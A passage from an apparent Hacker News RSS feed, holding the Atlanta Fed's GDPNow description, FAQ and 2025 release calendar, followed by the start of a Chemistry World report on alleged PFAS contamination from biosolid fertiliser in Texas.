            <description><![CDATA[<p>URL: <a href="https://www.atlantafed.org/cqer/research/gdpnow">https://www.atlantafed.org/cqer/research/gdpnow</a>, See on <a href="https://news.ycombinator.com/item?id=43246371">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="myTabContent">

<div id="Tab1" role="tabpanel" aria-labelledby="Element1">
                        <p>The growth rate of real gross domestic product (GDP) measured by the U.S. Bureau of Economic Analysis (BEA) is a key metric of the pace of economic activity. It is one of the four variables included in the economic projections of Federal Reserve Board members and Bank presidents for every other Federal Open Market Committee (FOMC) meeting. As with many economic statistics, GDP estimates are released with a lag whose timing can be important for policymakers. For example, of the four scheduled 2014 release dates of an “advance” (or first) estimate of GDP growth, two are on the second day of a scheduled FOMC meeting with the other two on the day after the meeting. In preparation for FOMC meetings, policymakers have the Fed Board staff projection of this “advance” estimate at their disposal. These projections—available through 2008 at the <a href="http://www.philadelphiafed.org/research-and-data/real-time-center/greenbook-data/">Philadelphia Fed’s Real Time Data Center</a>—have generally been more accurate than forecasts from simple statistical models. As stated by economists <a href="http://amstat.tandfonline.com/doi/abs/10.1198/jbes.2009.07214#.U20Z4FeUWSY">Jon Faust and Jonathan H. Wright in a 2009 paper</a>, “by mirroring key elements of the data construction machinery of the Bureau of Economic Analysis, the Fed staff forms a relatively precise estimate of what BEA will announce for the previous quarter’s GDP even before it is announced.”</p>
<p>The Atlanta Fed GDPNow model also mimics the methods used by the BEA to estimate real GDP growth. The GDPNow forecast is constructed by aggregating statistical model forecasts of 13 subcomponents that comprise GDP. Other private forecasters use similar approaches to “<a href="http://en.wikipedia.org/wiki/Nowcasting_%28economics%29">nowcast</a>” GDP growth. However, these forecasts are not updated more than once a month or quarter, are not publicly available, or do not have forecasts of the subcomponents of GDP that add “color” to the top-line number. The Atlanta Fed GDPNow model fills these three voids.</p>
<p>The BEA’s advance estimates of the subcomponents of GDP use publicly released data from the U.S. Census Bureau, U.S. Bureau of Labor Statistics, and other sources. Much of this data is displayed in the BEA’s <a href="https://www.bea.gov/data/gdp/gross-domestic-product" target="_blank">Key Source Data and Assumptions</a> table that accompanies the “advance” GDP estimate. GDPNow relates these source data to their corresponding GDP subcomponents using a “bridge equation” approach similar to the one described in a <a href="http://www.minneapolisfed.org/research/qr/qr2022.pdf">Minneapolis Fed</a> study by Preston J. Miller and Daniel M. Chin. Whenever the monthly source data is not available, the missing values are forecasted using econometric techniques similar to those described in papers by <a href="http://www.tandfonline.com/doi/abs/10.1198/073500102317351921#.U20n6leUWSY">James H. Stock and Mark W. Watson</a> and <a href="http://ideas.repec.org/a/eee/moneco/v55y2008i4p665-676.html">Domenico Giannone, Lucrezia Reichlin, and David Small</a>. A detailed description of the data sources and methods used in the GDPNow model is provided in an accompanying <a href="https://www.atlantafed.org/pubs/wp/14_07.cfm">Atlanta Fed working paper</a>.</p>
<p>As more monthly source data becomes available, the GDPNow forecast for a particular quarter evolves and generally becomes more accurate. That said, the forecasting error can still be substantial just prior to the “advance” GDP estimate release. It is important to emphasize that the Atlanta Fed GDPNow forecast is a model projection not subject to judgmental adjustments. It is not an official forecast of the Federal Reserve Bank of Atlanta, its president, the Federal Reserve System, or the FOMC.</p>
<p>©2017 Federal Reserve Bank of Atlanta. All rights reserved. Permission is granted to reproduce for personal and educational use only.</p>
                        
                    </div>
<div id="Tab2" role="tabpanel" aria-labelledby="Element2">
                        
<p><strong>Is GDPNow an official forecast of the Atlanta Fed or the Bank's president?</strong><br>
No, it is not an official forecast of the Atlanta Fed, its president, the Federal Reserve System, or the FOMC.</p>
<p><strong>Is any judgment used to adjust the forecasts?</strong><br>
No. Once the GDPNow model begins forecasting GDP growth for a particular quarter, the code will not be adjusted until after the "advance" estimate. If we improve the model over time, we will roll out changes right after the "advance" estimate so that forecasts for the subsequent quarter use a fixed methodology for their entire evolution. </p>
<p><strong>When will nowcasts of GDP growth in a particular quarter begin and end?</strong><br>
GDPNow nowcasts of real GDP growth in a particular quarter begin about 90 days before the "advance" estimate for GDP growth for the quarter is released; they end on the last business day with a data release GDPNow utilizes that precedes the release date of the Bureau of Economic Analysis’s (BEA) advance estimate of GDP growth. Except after annual benchmark or comprehensive revisions of GDP typically occurring in late July, GDPNow nowcasts for a quarter generally begin on the weekday after the advance estimate of GDP growth for the previous quarter is released. After comprehensive or benchmark GDP revisions, the initial GDPNow nowcast for the subsequent quarter can be delayed for around a week until the BEA releases revised “underlying detail tables” for the National Income and Product Accounts.</p>
<p>For example, GDPNow’s initial nowcast of real GDP growth in the first quarter of 2018 took place on Monday, January 29, 2018, the first weekday after Friday, January 26, 2018, when the advance estimate of real GDP growth in the fourth quarter of 2017 was released. The final GDPNow nowcast of real GDP growth in the first quarter of 2018 was made on April 26, 2018, and the advance estimate of real GDP growth in the first quarter of 2018 was released on April 27, 2018.
</p>
<p><strong>How frequently is the GDPNow forecast updated?</strong><br>
The model forecast is updated six or seven times a month on weekdays, with at least one following seven data releases: <a href="http://www.ism.ws/ismreport/mfgrob.cfm">Manufacturing ISM Report on Business</a>, <a href="http://www.census.gov/foreign-trade/Press-Release/current_press_release/">U.S. International Trade in Goods and Services (FT900)</a>, <a href="http://www.census.gov/wholesale/">Wholesale Trade</a>, <a href="http://www.census.gov/retail/">Monthly Retail Trade Report</a>, <a href="http://www.census.gov/construction/nrc/">New Residential Construction</a>, <a href="http://www.census.gov/manufacturing/m3/adv/pdf/durgd.pdf">Advance Report on Durable Goods Manufacturers</a>, and <a href="http://www.bea.gov/newsreleases/national/pi/pinewsrelease.htm">Personal Income and Outlays</a>. Other data releases, such as <a href="http://www.federalreserve.gov/releases/g17/current/">Industrial Production and Capacity Utilization</a> and <a href="http://www.realtor.org/topics/existing-home-sales">Existing-Home Sales</a>, are incorporated in the model as well and their impact on the model's forecast will be shown on the next weekday with one of the data releases. The proprietary forecasts from <em>Blue Chip Economic Indicators</em> and <em>Blue Chip Financial Forecasts</em> shown in the chart are available from <a href="http://www.bluechippubs.com/">Aspen Publishers</a>.</p>
<p><strong>How can I access historical forecasts from the GDPNow model?</strong><br>
These forecasts are available in <a href="https://www.frbatlanta.org/-/media/Documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx?la=en">this</a> downloadable spreadsheet. See the tab "ReadMe" in the spreadsheet for hyperlinks to the historical forecasts and other data for the model. In particular, the tab "TrackingDeepArchives" has forecasts for the 2011:Q3–2014:Q1 period (before the model went live), the tab "TrackingArchives" has forecasts from 2014:Q2 through the last quarter for which an advance estimate of GDP has been released by the BEA, and the tab "TrackRecord" has a comparison of the historical GDPNow model forecasts with the actual "advance" real GDP growth estimates from the BEA.</p>
<p><strong>Where can I read about the methods and source data used in the model?</strong><br>
A detailed description is given in a <a href="https://www.atlantafed.org/-/media/documents/research/publications/wp/2014/wp1407.pdf">working paper</a>&nbsp;describing the model. To summarize, the BEA's <a href="http://www.bea.gov/national/pdf/allchapters.pdf">NIPA Handbook</a> provides very detailed documentation on both the source data and methods used for estimating the subcomponents of GDP. The late Nobel Prize–winning economist Lawrence Klein pioneered many of the "bridge equation" methods used for making short-run forecasts of GDP growth using this source data; <a href="http://www.tradersshop.com/prod/2011106900000/CQM_Theory_Revision.pdf">a 1989 paper</a> he coauthored with E. Sojo describes the approach. Kathleen Navin, an economist at Macroeconomic Advisers, provides a bird's-eye view illustrating how to use a bridge equation approach in practice to improve GDP forecasts in <a href="https://www.dropbox.com/s/yx8kzd6dzdxvndd/Navin.pdf?dl=0">this 2017 presentation</a>. The econometric techniques used in our GDPNow model were heavily adapted from the GDP nowcasting models described in a 1996 Minneapolis Fed<em> Quarterly Review</em> article by <a href="http://www.minneapolisfed.org/research/qr/qr2022.pdf">Preston J. Miller and Daniel M. Chin</a> and a <a href="http://ideas.repec.org/a/eee/moneco/v55y2008i4p665-676.html">2008 paper</a> by the Board's David Small and economists Domenico Giannone and Lucrezia Reichlin.</p>
<p><strong>Where can I find alternative forecasts of GDP growth?</strong><br>
For model forecasts from other Reserve Banks, see the <a href="https://www.newyorkfed.org/research/policy/nowcast.html">New York Fed Nowcasting Report</a>, the <a href="https://fred.stlouisfed.org/series/STLENI">St. Louis Fed Economic News Index: Real GDP Nowcast</a>, the <a href="http://www.philadelphiafed.org/research-and-data/real-time-center/PRISM/">Philadelphia Research Intertemporal Stochastic Model (PRISM)</a>, and the Federal Reserve Bank of Cleveland's <a href="https://www.clevelandfed.org/en/our-research/indicators-and-data/yield-curve-and-gdp-growth.aspx">prediction model for GDP growth based on the slope of the yield curve</a>. <a href="https://www.economy.com/dismal/models/high-frequency-us-gdp-model.aspx">Moody's Analytics</a> and <a href="http://www.now-casting.com/">Now-Casting.com</a> produce proprietary model short-run GDP forecasts. For survey-based forecasts, see the Philadelphia Fed's <a href="http://www.philadelphiafed.org/research-and-data/real-time-center/survey-of-professional-forecasters/">quarterly Survey of Professional Forecasters,</a> which includes forecasts of real GDP and its major subcomponents. The <em>Wall Street Journal</em>'s <a href="http://online.wsj.com/public/page/economic-forecasting.html">Economic Forecasting Survey</a> occurs monthly, and the Moody's Analytics/CNBC <a href="http://www.cnbc.com/id/101508204">Rapid Update</a> survey generally occurs several times a week. Neither of these surveys includes forecasts of the subcomponents of GDP.</p>
<p><strong>How accurate are the GDPNow forecasts? Are they more accurate than "professional" forecasts?</strong><br>
The chart below shows GDPNow's real-time forecasts made just prior to the release of the initial estimate of the annualized growth rate of real GDP along with the initial estimates from the US Bureau of Economic Analysis.</p>

<p>Since we started tracking GDP growth with versions of this model in 2011, the average absolute error of final GDPNow forecasts is 0.77 percentage points. The <a href="http://en.wikipedia.org/wiki/Root-mean-square_deviation" target="blank">root-mean-squared error</a> of the forecasts is 1.15 percentage points. These accuracy measures cover initial estimates for 2011:Q3–2024:Q3. Some further analysis of GDPNow's forecast errors is available in <em>macroblog</em> posts located <a href="http://macroblog.typepad.com/macroblog/2016/05/gdpnow-and-then.html">here</a> and <a href="http://macroblog.typepad.com/macroblog/2016/05/can-two-wrongs-make-a-right.html">here</a>. We have made some improvements to the model from its earlier versions, and the model forecasts have become more accurate over time (the complete track record is <a href="https://www.frbatlanta.org/-/media/Documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx?la=en">here</a>). When back-testing with <em>revised</em> data, the root mean-squared error of the model's out-of sample forecast with the same data coverage that an analyst would have just before the "advance" estimate is 1.15 percentage points for the 2000:Q1–2013:Q4 period. The figure below shows how the forecasts become more accurate as the interval between the date the forecast is made and the forthcoming GDP release date narrows.</p>

<!--<p><img width="472" height="364" title="Root Mean Square Forecast Error of GDP Growth (SAAR) for GDPNow Model" alt="Root Mean Square Forecast Error of GDP Growth (SAAR) for GDPNow Model" src="~/media/Images/cqer/researchcq/gdpnow/gdpnowforecastchart.ashx" class="centeredImage" /></p>-->
<p>Overall, these accuracy metrics do not give compelling evidence that the model is more accurate than professional forecasters. The model does appear to fare well compared to other conventional statistical models.</p>
<p><strong>How are revisions to data not yet reflected in the latest GDP release handled?</strong><br>
In general, the model does not attempt to anticipate how data releases after the latest GDP report will affect the revisions made in the forthcoming GDP release. The exception is the "change in private inventories" subcomponent, where revisions to the prior quarter's reading affect GDP growth in the current quarter. Users of the GDPNow forecast should generally use the forecasts of the change in "net exports" and the change in the "change in private inventories," and not forecasts of the levels. Revisions to retail sales are used to anticipate revisions to real monthly expenditures in the "<a href="http://www.bea.gov/faq/index.cfm?faq_id=519">PCE control group</a>" and revisions to housing starts are used to anticipate revisions in the <a href="http://www.census.gov/construction/c30/c30index.html">monthly value of private residential construction spending put in place</a>.</p>
<p><strong>Do you share your code?</strong><br>
At this point, no. However, the Excel <a href="https://www.frbatlanta.org/-/media/Documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx?la=en">spreadsheet</a> gives the numerical details—including the raw data and model parameters—of how the monthly data map into forecasts of the subcomponents of GDP.</p>
<p><strong>What are the differences between GDPNow and the FRBNY Nowcast models? Why do the two models have different forecasts?</strong></p>
<p>The FRBNY Nowcast model of real GDP growth is based on a dynamic factor model described in this <a href="http://libertystreeteconomics.newyorkfed.org/2016/04/just-released-introducing-the-frbny-nowcast.html#.Vw0Qz3qgYks">Liberty Street blog entry.</a> The <a href="https://www.chicagofed.org/publications/cfnai/index">Chicago Fed National Activity Index</a> and <a href="https://www.philadelphiafed.org/research-and-data/real-time-center/business-conditions-index">Aruoba-Diebold-Scotti Business Conditions Index</a> are both indicators of economic activity estimated from factor models. The latest nowcast from the FRBNY Nowcast model along with some related Q&amp;A is available <a href="https://www.newyorkfed.org/research/policy/nowcast.html">here</a>.</p>
<p>The Atlanta Fed's GDPNow also uses a dynamic factor model—based on a <a href="http://www.sciencedirect.com/science/article/pii/S0304393208000652">model</a> from one of the New York Fed economists who coauthored the Liberty Street blog entry—but uses the factor only as an input to fill in the yet-to-be-released monthly source data for GDP. The estimates of this dynamic factor are available in the <strong>Factor </strong>tab of this <a href="https://www.atlantafed.org/-/media/documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx">Excel file</a>.</p>
<p>The monthly source data are then used to estimate the subcomponents of GDP, which are then aggregated up to a real GDP growth nowcast. Besides a dynamic factor model, GDPNow uses several other econometric techniques, including "bridge equations" and Bayesian vector autoregressions, to nowcast the subcomponents of GDP. The exact methods are described in this <a href="https://www.atlantafed.org/sitecore/service/notfound.aspx?item=web%3a%7b8D93F92E-8FC1-46D3-A7F2-A00EF85E4B28%7d%40en">working paper</a>. The numerical details—including the raw data and model parameters—translating the monthly data into nowcasts of the subcomponents of GDP in the latest GDPNow forecast are available in this <a href="https://www.atlantafed.org/-/media/documents/cqer/researchcq/gdpnow/GDPTrackingModelDataAndForecasts.xlsx">Excel file</a> (see the <strong>ReadMe</strong> tab).</p>
<p>Because GDPNow and the FRBNY Nowcast are different models, they can generate different forecasts of real GDP growth. Our policy is not to comment on or interpret any differences between the forecasts of these two models.</p>
                        
                    </div>
<div id="Tab3" role="tabpanel" aria-labelledby="Element3">
                        <p>These charts show how the forecasted GDP subcomponent contributions to growth aggregate up to GDPNow's real GDP growth forecast for each update day in a particular forecast quarter and how changes in the subcomponent contribution forecasts aggregate up to changes in the GDP growth forecasts. Whenever a user hovers the cursor over a bar in one of the charts, the pop-up box displays the data releases for the date of the bar as well the numerical values for the GDP growth forecast and either the levels or changes in the subcomponent contribution forecasts. For previously reported quarters, the final date in the top chart shows the official first estimates of real GDP growth and the subcomponent contributions to growth from the Bureau of Economic Analysis (BEA). The final date in the bottom chart shows the forecast errors of the final GDPNow projections of the BEA's first estimates of real GDP growth and the subcomponent contributions to growth.</p>

<p><label for="chooseQuarter">Select a quarter:</label></p>



                        
                    </div>
<div id="Tab4" role="tabpanel" aria-labelledby="Element4">
                        
<p>Release times shown are from the original source. The GDPNow model is usually updated within a few hours following these times. Release schedule subject to change.</p>
<table>
    <tbody>
        <tr>
            <td><strong>Release</strong></td>
            <td><strong>Date of release</strong></td>
            <td><strong>Time of release</strong></td>
        </tr>
        <tr>
            <td>Construction spending</td>
            <td>1/2/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index</td>
            <td>1/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>1/7/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>1/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Import and export prices</td>
            <td>1/16/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Industrial production and capacity utilization</td>
            <td>1/17/2025</td>
            <td>9:15 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>1/28/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2024:Q4 GDP growth: Advance Economic Indicators</td>
            <td>1/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q1 GDP growth: Personal income and outlays, NIPA underlying detail tables</td>
            <td>1/31/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>2/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>2/5/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Employment situation, Wholesale trade</td>
            <td>2/7/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>2/14/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>2/19/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Economic Indicators</td>
            <td>2/28/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>3/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), Wholesale trade</td>
            <td>3/6/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories</td>
            <td>3/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Industrial production and capacity utilization, Import and export prices</td>
            <td>3/18/2025</td>
            <td>9:15 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>3/26/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables</td>
            <td>3/28/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>4/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>4/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization</td>
            <td>4/16/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>4/17/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1), Existing-home sales</td>
            <td>4/24/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2025:Q1 GDP growth:  Advance Economic Indicators</td>
            <td>4/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q2 GDP growth:  Personal income and outlays, Q1 GDP, NIPA underlying detail tables</td>
            <td>4/30/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>5/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>5/6/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>5/8/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Producer Price Index</td>
            <td>5/15/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Import and export prices</td>
            <td>5/16/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>5/27/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Economic Indicators</td>
            <td>5/30/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>6/2/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>6/5/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>6/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>6/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>6/18/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables</td>
            <td>6/27/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>7/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), Employment situation, Census M3-2 manufacturing (Full report), ISM Services</td>
            <td>7/3/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>7/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Import and export prices</td>
            <td>7/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>7/18/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>7/25/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2025:Q2 GDP growth:  Advance Economic Indicators</td>
            <td>7/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q3 GDP growth:  Personal income and outlays, NIPA underlying detail tables</td>
            <td>7/31/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending, Employment situation</td>
            <td>8/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>8/5/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>8/7/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>8/15/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>8/19/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>8/26/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Economic Indicators</td>
            <td>8/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>9/2/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), ISM Services</td>
            <td>9/4/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade, Producer Price Index</td>
            <td>9/10/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Industrial production and capacity utilization, Import and export prices</td>
            <td>9/16/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>9/17/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables**</td>
            <td>9/26/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>10/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>10/7/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>10/9/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>10/27/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Final nowcast of 2025:Q3 GDP growth:  Advance Economic Indicators</td>
            <td>10/29/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Initial nowcast of 2025:Q4 GDP growth:  Personal income and outlays, NIPA underlying detail tables</td>
            <td>10/31/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report), Census M3-2 manufacturing (Full report)</td>
            <td>11/4/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade</td>
            <td>11/6/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories, Producer Price Index</td>
            <td>11/14/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts</td>
            <td>11/19/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, Advance Census manufacturing (M3-1), GDP, Advance Economic Indicators, New-home sales</td>
            <td>11/26/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>ISM Manufacturing Index, Construction spending</td>
            <td>12/1/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>International trade (Full report)</td>
            <td>12/4/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Wholesale trade, Consumer Price Index</td>
            <td>12/10/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Housing starts, Import and export prices</td>
            <td>12/16/2025</td>
            <td>8:30 AM</td>
        </tr>
        <tr>
            <td>Retail sales + inventories</td>
            <td>12/17/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Personal income and outlays, NIPA underlying detail tables, GDP, Existing-home sales</td>
            <td>12/19/2025</td>
            <td>10:00 AM</td>
        </tr>
        <tr>
            <td>Advance Census manufacturing (M3-1)</td>
            <td>12/24/2025</td>
            <td>8:30 AM</td>
        </tr>
    </tbody>
</table>
<p><a href="https://www.atlantafed.org/-/media/documents/cqer/researchcq/gdpnow/GDPNowcastDataReleaseDates.xlsx">Download a spreadsheet of these release dates</a></p>
<p>*Time of last economic release; GDPNow update typically released 2 to 3.5 hours after this time.</p>
<p>**Timing of 9/26 GDPNow updates depends on details regarding 2025 annual revision of the National Income and Product Accounts.  Further details to be determined/announced.</p>
                        
                    </div>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PFAS in fertilisers blamed for killing livestock in Texas and wreaking havoc (101 pts)]]></title>
            <link>https://www.chemistryworld.com/news/pfas-in-fertilisers-blamed-for-killing-livestock-in-texas-and-wreaking-havoc/4020874.article</link>
            <guid>43245674</guid>
            <pubDate>Mon, 03 Mar 2025 19:26:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.chemistryworld.com/news/pfas-in-fertilisers-blamed-for-killing-livestock-in-texas-and-wreaking-havoc/4020874.article">https://www.chemistryworld.com/news/pfas-in-fertilisers-blamed-for-killing-livestock-in-texas-and-wreaking-havoc/4020874.article</a>, See on <a href="https://news.ycombinator.com/item?id=43245674">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>The mystery of why farmers had started falling ill in Johnson County, Texas and what killed the fish in their ponds and livestock on their ranches may have been solved. The culprit is <a href="https://peer.org/wp-content/uploads/2024/02/2024.02.27-First-Amended-Complaint-Date-Stamped.pdf">claimed to be a fertiliser contaminated with dangerous levels of polyfluoroalkyl and perfluoroalkyl substances (PFAS)</a> that was spread on adjacent farmland, according to the findings of an ongoing criminal investigation.</p>
<p>The case began in late December 2022 when Dana Ames, an environmental crimes investigator for Johnson County, received a complaint from a farmer who said a neighbour was spreading what appeared to be fertiliser that had been smoking for days. He reported that the valley surrounding his property had filled up with smoke, which was creating breathing problems for himself, his wife and neighbours. Further, the farmer alleged that previous spreading of this material by the same neighbour had caused the fish in his pond and other nearby ponds to die and that it had led to his animals becoming ill too.</p>
<p>When Ames arrived on the scene, she observed a dozen or more large, black smouldering piles emitting large plumes of smoke with a smell so pungent that Ames recalls almost<strong> </strong>vomiting. She reported that the smoke also made it hard for her to breathe.<strong> </strong>Although it is unclear why the product was smoking, Ames says there are ‘a couple of different theories’ having to do with microplastics and composting.</p>
<div data-attachment="538965" data-sequence="2">
<p><img alt="Biofosil piles" src="https://d2cbg94ubxgsnp.cloudfront.net/Pictures/480xany/9/6/5/538965_a14_61843_crop.jpg" sizes="(max-width: 1023px) 100vw, 780px" srcset="https://d2cbg94ubxgsnp.cloudfront.net/Pictures/480xany/9/6/5/538965_a14_61843_crop.jpg 480w,https://d2cbg94ubxgsnp.cloudfront.net/Pictures/600xany/9/6/5/538965_a14_61843_crop.jpg 600w,https://d2cbg94ubxgsnp.cloudfront.net/Pictures/780xany/9/6/5/538965_a14_61843_crop.jpg 780w" loading="eager" width="4608" height="3072"></p>


</div>
<p>Ames observed the product being spread by tractor and quickly discovered that it was a Synagro fertiliser made from biosolids – municipal wastewater-treated sewage sludge from the city of Fort Worth, Texas. She immediately opened an investigation and began collecting samples of soil, pond water, well water, as well as fish and animal tissue, for analysis. The Synagro fertiliser itself was also tested.</p>
<p>Synagro has denied that its fertilisers have harmed the health of farmers or livestock and is contesting the lawsuit.</p>
<p>In a statement, the firm said: ‘None of the plaintiffs themselves used Synagro products and the biosolids applied by a farmer working with Synagro met all [US Environmental Protection Agency] and Texas Commission on Environmental Quality requirements. US EPA continues to support land application of biosolids as a valuable practice that recycles nutrients to farmland and has not suggested that any changes in biosolids management is required.’</p>
<p>‘As a matter of fact, without any response from Synagro, the plaintiffs amended the complaint to drastically reduce the concentrations of PFAS alleged in the complaint when it was originally filed,’ the company added.</p>
<p>In the two years since the investigation began, Johnson County Commissioner&nbsp;<a title="https://www.johnsoncountytx.org/government/commissioners/commissioner-precinct-4" href="https://www.johnsoncountytx.org/government/commissioners/commissioner-precinct-4" target="_blank" rel="noreferrer noopener">Larry Woolley</a>, a lifelong farmer and rancher with a degree in agriculture, cites reports of hundreds of fish and <a target="_blank" rel="noreferrer noopener">about </a>35 cattle and five horses dying that were blamed on PFAS-contaminated biosolids.</p>
